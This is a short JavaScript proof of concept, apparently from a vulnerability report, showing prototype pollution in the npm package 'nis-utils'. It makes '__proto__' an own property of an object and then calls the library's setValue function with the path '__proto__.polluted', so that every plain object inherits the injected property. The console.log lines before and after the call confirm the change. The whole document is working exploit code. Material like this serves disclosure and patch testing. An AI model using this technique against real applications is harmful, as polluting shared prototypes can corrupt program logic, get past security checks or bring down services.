var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const nisUtils = require('nis-utils');
const object1 = {};
console.log({}.polluted);
nisUtils.object.setValue(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);